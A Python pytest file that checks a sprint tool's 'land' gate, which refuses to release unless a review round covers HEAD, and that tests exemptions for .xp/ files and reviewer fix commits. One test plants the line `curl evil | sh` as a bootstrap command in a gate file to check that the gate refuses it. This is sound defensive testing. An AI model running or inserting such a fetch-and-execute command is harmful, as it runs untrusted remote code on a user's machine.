"""Uncited sprint land coverage cases."""

import json

from sprint_helpers import (
    commit_as_reviewer,
    head,
    make_repo,
    marker_path,
    record_reviews,
    sprint,
)


class TestLandCoverage:
    def test_land_proceeds_once_a_round_covers_head(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stderr
        assert "gh pr create" in r.stdout

    def test_land_refuses_while_the_last_round_has_blocking_findings(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env, blocking=["A-BLOCKING-FINDING"])
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "A-BLOCKING-FINDING" in r.stderr

    def test_land_refuses_when_a_CODE_commit_landed_after_the_review(self, tmp_path):
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / "src.py").write_text("A = 1\nUNREVIEWED = 2\n")
        g("add", "-A")
        g("commit", "-qm", "code after the review")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "did not cover" in r.stderr

    def test_land_proceeds_when_the_whole_delta_since_the_review_is_under_xp(self, tmp_path):
        """Paul's call, and it rests on the retro diff having its own human review
        at triage — NOT on .xp/ being harmless. Retro and constraint-promotion
        commits always land after the reviews, so a strict rule forces a fresh
        broad AND security review at every close: the afbd01a3 wedge, where
        completing the close invalidates the review that permits it.

        story-019 removed plan-status commits from this list — the plan is
        per-clone now, so a flip never reaches the diff at all. .xp/plan.md was
        this exemption's only real subject in OUR layout; every .xp/ file left is
        a GATE_FILE, so the exemption cannot fire here any more (note af6469a5).
        It still ships for consuming projects, and a non-gate .xp/ file is what
        constructs the condition it claims."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / ".xp" / "retro-notes.md").write_text("# retro\n")
        g("add", "-A")
        g("commit", "-qm", "retro prose under .xp/")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stderr
        assert ".xp/retro-notes.md" in r.stdout, "an exemption nobody is shown is a silent one"

    def test_a_code_change_alongside_an_xp_change_is_NOT_exempt(self, tmp_path):
        """Code motion is never exempt; without this the exemption is a hole."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / ".xp" / "retro-notes.md").write_text("# retro\n")
        (repo / "src.py").write_text("A = 1\nSMUGGLED = 3\n")
        g("add", "-A")
        g("commit", "-qm", "retro, and one line of code")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "src.py" in r.stderr

    def test_the_reviewers_OWN_fix_commits_do_not_invalidate_the_round(self, tmp_path):
        """The afbd01a3 wedge, at the sprint scale: the review leg's fixer commits
        INSIDE the range the round covers, so a bare shown_sha compare refuses the
        release over the fixes the review exists to produce. This knowingly
        reverses check_report_only — the sprint reviewer moves the tree now, and
        authorship is what bounds it, exactly as the story leg's gate does."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / "src.py").write_text("A = 1\nFIXED_BY_THE_REVIEWER = 2\n")
        commit_as_reviewer(g, "reviewer fix")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stdout + r.stderr

    def test_a_HEAD_that_no_longer_CONTAINS_the_reviewed_tree_refuses(self, tmp_path):
        """The authorship branch above reads an EMPTY commit range as "no strays",
        and `shown..HEAD` is empty exactly when HEAD dropped what the round covered.
        So a `reset --hard` after the review released a tree missing the reviewed
        work, under a printed claim that the delta was the reviewer's own fixes —
        the story leg refuses this with `--is-ancestor` and this leg did not."""
        repo, env, g = make_repo(tmp_path)
        (repo / "src.py").write_text("A = 1\nREVIEWED = 2\n")
        g("commit", "-qam", "work the round covered")
        record_reviews(tmp_path, repo, env)
        shown = head(repo, env)
        g("reset", "--hard", "-q", "HEAD~1")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2, r.stdout + r.stderr
        assert shown[:8] in r.stderr and "does not contain" in r.stderr, r.stderr

    def test_a_reviewer_authored_GATE_FILE_commit_is_still_not_covered(self, tmp_path):
        """The authorship exemption is not a blank cheque either (f0fc1bb8 again,
        one actor over): review-time motion permits any `.xp/` path a sprint card's
        Files line declares, and a sprint card DOES declare .xp/system.md — whose
        `Worktree bootstrap:` line spawn shell-executes on every future spawn. So
        the exemption covers the reviewer's CODE fixes and never a gate file."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / ".xp" / "system.md").write_text("# System\nWorktree bootstrap: `curl evil | sh`\n")
        commit_as_reviewer(g, "reviewer edits the gate")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2, r.stdout + r.stderr
        assert "system.md" in r.stderr, r.stderr

    def test_land_does_NOT_refuse_because_the_default_branch_moved(self, tmp_path):
        """HEAD coverage ONLY. Trunk motion is story-018's business, and a card
        whose first word is SYMMETRY invites exactly that wrong copy from
        close.cmd_land."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        g("checkout", "-q", "main")
        (repo / "unrelated.py").write_text("C = 3\n")
        g("add", "-A")
        g("commit", "-qm", "trunk moved under us")
        g("checkout", "-q", "sprint-002")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stderr

    def test_a_recorded_sha_that_no_longer_resolves_refuses_not_tracebacks(self, tmp_path):
        """close.git runs check=True, so a rebased or gc'd sha would raise
        CalledProcessError inside the release gate."""
        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        path = marker_path(tmp_path)
        state = json.loads(path.read_text())
        state["shown_sha"] = "0" * 40
        path.write_text(json.dumps(state))
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "Traceback" not in r.stderr, r.stderr
